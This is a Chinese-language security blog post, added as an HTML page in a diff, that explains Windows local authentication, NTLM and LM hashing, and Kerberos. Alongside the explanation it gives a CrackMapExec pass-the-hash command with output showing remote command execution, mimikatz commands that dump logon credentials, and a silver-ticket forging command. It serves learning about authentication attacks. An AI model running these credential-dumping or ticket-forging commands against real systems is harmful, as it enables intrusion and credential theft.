@@ -1,0 +1,1767 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="mes9s0">
+    
+    <title>
+        
+            关于Windows协议学习 |
+        
+        Mes9s0&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/biaoti.jpeg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/xiaoxin.jpeg","favicon":"/images/biaoti.jpeg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"只是希望进步而已."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="CaiJiang's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Mes9s0&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">关于Windows协议学习</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/xiaoxin.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">mes9s0</span>
+                        
+                            <span class="author-label">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2023-03-10 16:02:21</span>
+        <span class="mobile">2023-03-10 16:02</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Windows%E8%AE%A4%E8%AF%81/">Windows认证</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Windows/">Windows</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81/">本地认证</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81/">网络认证</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Kerberos/">Kerberos</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Windows-Access-Token/">Windows Access Token</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>11.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>44 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    网络上关于Windows认证方式的学习的文章，在此为了对原理理解更加透彻，现在跟着网上大佬们的资料学习，供以后参考使用。</p>
+<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><h3 id="本地认证基础知识"><a href="#本地认证基础知识" class="headerlink" title="本地认证基础知识"></a>本地认证基础知识</h3><p>​    Windows密码存储地址：%SystemRoot%\system32\config\sam</p>
+<p>​    当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功。这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。</p>
+<p>​    <strong>Windows本身不保存明文密码，只保留密码的Hash</strong></p>
+<p>​    为了保证存储的不是明文，从而采用Hash，但是密码Hash也需要特定的生成算法以及表现形式。</p>
+<h3 id="NTLM-NT-LAN-Manager-Hash"><a href="#NTLM-NT-LAN-Manager-Hash" class="headerlink" title="NTLM(NT LAN Manager) Hash"></a>NTLM(NT LAN Manager) Hash</h3><p>​    在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。</p>
+<p>​    NTLM Hash是支持Net NTLM认证协议及本地认证过程中的一个重要参与物，其长度为32位，由数字与字母组成。</p>
+<pre><code>admin:1003:AAD3B435B51404EEAAD3B435B51404EE:111F54A2A4C0FB3D7CD9B19007809AD6:::
+Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::
+Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9A81:::
+</code></pre>
+<p>​    其中冒号分割的前半段<code>AAD3B435B51404EEAAD3B435B51404EE</code>是lm hash，后半段<code>111F54A2A4C0FB3D7CD9B19007809AD6</code>是ntlm hash。前半段放到cmd5解密会发现是空密码，那是因为Windows版本的原因。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-095521.png"
+                      alt="image-20230423175521048"
+                ></p>
+<h3 id="NTLM-Hash与NTLM"><a href="#NTLM-Hash与NTLM" class="headerlink" title="NTLM Hash与NTLM"></a>NTLM Hash与NTLM</h3><p>​    这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p>
+<p>​    <strong>NTLM与NTLM Hash相互对应。</strong></p>
+<p>​    在本地认证的过程中，其实是把用户输入的密码转换为NTLM hash与SAM中NTLM hash进行比较。NTLM Hash的前身是LM Hash，目前基本淘汰，但是还是存在。</p>
+<h3 id="NTLM-Hash的产生"><a href="#NTLM-Hash的产生" class="headerlink" title="NTLM Hash的产生"></a>NTLM Hash的产生</h3><p>​    密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(16进制编码) = 61646d696e</span><br><span class="line">61646d696e -&gt; Unicode = 610064006d0069006e00</span><br><span class="line">610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
+
+<p>​    首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。</p>
+<ul>
+<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登陆程序，用于管理用户登录和退出。</li>
+<li>LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-124726.png"
+                      alt="image-20230422204725628"
+                ></p>
+<h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>​    在NTLM协议问世之前，它对前身就是LM（LAN Manager）协议。<strong>LM与NTLM协议的认证机制相同，但是加密算法不同。</strong>目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。LM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">将所有小写字母转换为大写字母</span><br><span class="line">• &gt;123ABC // 未达到7个字符</span><br><span class="line">• 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补</span><br><span class="line">• &gt;31323341424300000000000000</span><br><span class="line">• 将密码分割为两组7个字节的块</span><br><span class="line">• &gt;31323341424300 00000000000000 // 16进制</span><br><span class="line">• 将每组转化为比特流，不足56Bit则在左边加0</span><br><span class="line">• &gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000</span><br><span class="line">• 将比特流按照7比特一组，分出8组，末尾加0</span><br><span class="line"></span><br><span class="line">由于后者都为0，结果可想而知，那就都是0;</span><br><span class="line">• 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。</span><br><span class="line">• -&gt; 00110000100110001000110001101000000101000001001000001100 00000000</span><br><span class="line">• -&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C</span><br><span class="line">• 由于我们的密码不超过7字节，所以后面的一半是固定的:</span><br><span class="line">• AA-D3-B4-35-B5-14-04-EE</span><br><span class="line">• 连接两个DES加密字符串。这是LM哈希。</span><br><span class="line">• 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE</span><br></pre></td></tr></table></figure>
+
+<p>​    <strong>由于我们的密码不超过7字节，所以后面的一半是固定的:AA-D3-B4-35-B5-14-04-EE</strong></p>
+<p>​    在上面的产生过程中，脆弱点就在于DES的Key（<code>KGS!@#$%</code>）是固定的，也就是说，有了Key就能够解出原文。</p>
+<p>​    并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。</p>
+<h2 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h2><p>​    工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。</p>
+<p>​    <strong>假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。</strong></p>
+<p>​    这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。</p>
+<p>​    早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。</p>
+<h3 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h3><p>​    NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。现在已经到了NTLMv2</p>
+<p>​    <strong>这个协议只支持Windows</strong></p>
+<h3 id="Challenge-挑战-Response-响应"><a href="#Challenge-挑战-Response-响应" class="headerlink" title="Challenge(挑战)/Response(响应)"></a>Challenge(挑战)/Response(响应)</h3><p>​    NTLM协议的认证过程分为三步：</p>
+<ul>
+<li>协商</li>
+<li>质询</li>
+<li>验证</li>
+</ul>
+<p>​    <strong>协商</strong>：主要用于确认双方协议版本</p>
+<p>​    <strong>质询</strong>：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的运作流程。</p>
+<p>​    <strong>验证</strong>：验证主要是在质询完成后，验证结果，是认证的最后一步。</p>
+<p>​    质询的完整过程：</p>
+<ul>
+<li><p>1.客户端向服务器端发送用户信息(用户名)请求</p>
+</li>
+<li><p>2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的<strong>NTLM Hash</strong>加密Challenge(16位随机字符)， 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</p>
+</li>
+<li><p>//第二部可以理解为：Net NTLM Hash = NTLM Hash(Challenge)</p>
+</li>
+<li><p>3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</p>
+</li>
+</ul>
+<p>​    其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。并且这个NTLM Hash始终没有在网络中传输。</p>
+<p>​    注意:</p>
+<p>​    1. Chanllenge是Server产生的一个16字节的随机数，每次认证都不同</p>
+<p>​    2. Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-150045.png"
+                      alt="image-20230422230044957"
+                ></p>
+<h3 id="NTLM-V2协议"><a href="#NTLM-V2协议" class="headerlink" title="NTLM V2协议"></a>NTLM V2协议</h3><p>​    NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。</p>
+<p>​    具体有什么不同:</p>
+<ul>
+<li><strong>Challage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。</strong></li>
+<li><strong>Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</strong></li>
+</ul>
+<h3 id="NTLM协议延伸"><a href="#NTLM协议延伸" class="headerlink" title="NTLM协议延伸"></a>NTLM协议延伸</h3><p>​    我们都用过Responder工具，那么其实它就是启动一个NTLM服务端，服务端可以得到客户端发过来的Net-NTLM hash</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-165638.png"
+                      alt="img"
+                ></p>
+<h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>​    在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，尤其是在域环境下。</p>
+<p>​    哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又想扩大战果的问题。</p>
+<p><strong>Pass The Hash - 必要条件</strong></p>
+<ul>
+<li>哈希传递需要被认证的主机能够访问到服务器</li>
+<li><strong>哈希传递需要被传递认证的用户名</strong></li>
+<li>哈希传递需要被传递认证用户的NTLM Hash</li>
+</ul>
+<p>要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge。其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。</p>
+<p>Pass The Hash的工具：</p>
+<ul>
+<li>Smbmap</li>
+<li>CrackMapExec</li>
+<li>Smbexec</li>
+<li>Metasploit</li>
+</ul>
+<p>使用CrackMapExec实现Hash传递：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:<span class="meta"># cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami</span></span><br><span class="line">SMB <span class="number">192.168</span><span class="number">.3</span><span class="number">.5</span> <span class="number">445</span> LIYINGZHEA30B</span><br><span class="line">[*] Windows <span class="number">7</span> Ultimate <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (name:LIYINGZHEA30B)</span><br><span class="line">(domain:PAYLOADS) (signing:False) (SMBv1:True)</span><br><span class="line">SMB <span class="number">192.168</span><span class="number">.3</span><span class="number">.5</span> <span class="number">445</span> LIYINGZHEA30B</span><br><span class="line">[+] PAYLOADS\administrator <span class="title function_">dab7de8feeb5ecac65faf9fdc6cac3a9</span></span><br><span class="line"><span class="params">(Pwn3d!)</span>SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Kerberos域认证"><a href="#Kerberos域认证" class="headerlink" title="Kerberos域认证"></a>Kerberos域认证</h2><h3 id="Active-Directory-活动目录-概念"><a href="#Active-Directory-活动目录-概念" class="headerlink" title="Active Directory(活动目录)概念"></a>Active Directory(活动目录)概念</h3><p>​    Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务。</p>
+<p>​    活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。</p>
+<ul>
+<li>Active Directory存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active Directory使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</li>
+<li>网络对象分为:用户、用户组、计算机、域、组织单位以及安全策略等。</li>
+</ul>
+<h3 id="Active-Directory-活动目录-功能"><a href="#Active-Directory-活动目录-功能" class="headerlink" title="Active Directory(活动目录)功能"></a>Active Directory(活动目录)功能</h3><ul>
+<li>服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。</li>
+<li>用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮件系统集成)、用户组管理、用户身份认证、用户授权管理等， 按省实施组管理策略。</li>
+<li>资源管理:管理打印机、文件共享服务等网络资源。</li>
+<li>桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特 征限制、网络连接限制、安全配置限制等。</li>
+<li>应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。</li>
+</ul>
+<p>​    在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。</p>
+<p>​    这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p>
+<h3 id="域认证体系-Kerbroes"><a href="#域认证体系-Kerbroes" class="headerlink" title="域认证体系 - Kerbroes"></a>域认证体系 - Kerbroes</h3><p>​    Kerberos 是一种网络认证协议，其设计目标是通过<strong>密钥系统</strong>为客户机 / 服务器应用程序提供强大的认证服务。<strong>该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。</strong></p>
+<h3 id="域认证所参与的角色"><a href="#域认证所参与的角色" class="headerlink" title="域认证所参与的角色"></a>域认证所参与的角色</h3><p>​    Kerberos的标志是三只狗头，狗头分别代表以下角色：</p>
+<ul>
+<li><strong>Client</strong></li>
+<li><strong>Server</strong></li>
+<li><strong>KDC(Key Distribution Center) = DC(Domain Controller)</strong></li>
+</ul>
+<p>​    Kerberos认证协议的基础概念：</p>
+<p>​    票据（Ticket）：是网络对象互相访问的凭证。 TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p>
+<h3 id="域认证所参与的角色（KDC）"><a href="#域认证所参与的角色（KDC）" class="headerlink" title="域认证所参与的角色（KDC）"></a>域认证所参与的角色（KDC）</h3><p>​    KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成：</p>
+<ul>
+<li>Authentication Service（AS）: <strong>为client生成TGT的服务</strong></li>
+<li>Ticket Granting Service（TGS）: <strong>为client生成某个服务的ticket</strong></li>
+<li>account database（AD），存储所有client的白名单，<strong>只有存在于白名单的client才能顺利申请到TGT</strong>。</li>
+</ul>
+<p>​    从物理层面看，AD与KDC均为域控制器(Domain Controller)。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-173958.png"
+                      alt="image-20230423013957918"
+                ></p>
+<h3 id="域认证粗略流程"><a href="#域认证粗略流程" class="headerlink" title="域认证粗略流程"></a>域认证粗略流程</h3><ol>
+<li>client向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的， 也就是白名单黑名单的说法。这就是AS服务完成的工作，通过在AD中存储黑名单和白名单来区分client。成功后，返回AS返回TGT给client。</li>
+<li>client得到了TGT后，继续向kerberos请求，希望获取访问 server的权限。kerberos又得到了这个消息，这时候通过client 消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。</li>
+<li>client得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。</li>
+</ol>
+<h3 id="域认证详细流程"><a href="#域认证详细流程" class="headerlink" title="域认证详细流程"></a>域认证详细流程</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-174953.png"
+                      alt="image-20230423014953231"
+                ></p>
+<p>​    首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p>
+<p>​    KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p>
+<ul>
+<li>Session Key用于客户端向TGS服务通信。</li>
+<li>域内所有网络对象的凭证都在AD中保存</li>
+<li>KDC中某个用户指的是krbtgt</li>
+</ul>
+<p>数据结构：</p>
+<p>这是客户端发送请求信息的数据结构：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-175741.png"
+                      alt="image-20230423015741694"
+                ></p>
+<p>这是KDC返回数据的结构</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-175753.png"
+                      alt="image-20230423015752492"
+                ></p>
+<p>​    其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket。</p>
+<p>​    Kerberos是一个假设网络环境不安全的情况下能够正常进行认证工作的协议。</p>
+<p>​    <strong>第一步中，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，如果有，我们就可以伪造黄金票据</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-022225.png"
+                      alt="image-20230423102224827"
+                ></p>
+<p>​    第二步客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p>
+<p>​    如果假设这个数据被中间人窃取到，也无法在短时间内破解，因为KDC会校验时间戳。</p>
+<p>​    KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p>
+<p>​    验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p>
+<p>Ticket组成如下：</p>
+<p>​    Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-034129.png"
+                      alt="image-20230423114128907"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-034916.png"
+                      alt="image-20230423114915999"
+                ></p>
+<p>​    在第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p>
+<ul>
+<li>Ticket客户端无法解密</li>
+<li>服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp)</li>
+<li>比较时间长度</li>
+</ul>
+<p>​    校验通过后，认证成功，该票据会一直存在客户端内存中。</p>
+<p><strong>其实，TGT的结构和Ticket结构是相同的，只是中间的session key和server session key是不同的，session key是AS给客户端的，而server session key是TGS给客户端的。</strong></p>
+<h3 id="白银票据-Silver-Tickets"><a href="#白银票据-Silver-Tickets" class="headerlink" title="白银票据(Silver Tickets)"></a>白银票据(Silver Tickets)</h3><p>​    白银票据特点:</p>
+<ul>
+<li>1.不需要与KDC进行交互</li>
+<li>2.需要目标服务的NTLM Hash</li>
+</ul>
+<p>在第三步认证中的Ticket的组成:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket=Server Hash(Server Session Key+Client info+End Time) </span><br></pre></td></tr></table></figure>
+
+<p>​    当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p>
+<p>​    <strong>PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。</strong>我们只需要知道server的Hash，我们就可以伪造一个票据，但是这个票据只能够在server使用，其他的不能用。</p>
+<h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>​    Other：</p>
+<ul>
+<li>kerberos::list #列出票据</li>
+<li>kerberos::purge # 清除票据</li>
+</ul>
+<p>​    首先需要导出Server Hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt</span><br></pre></td></tr></table></figure>
+
+<p>​    伪造票据:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit</span><br></pre></td></tr></table></figure>
+
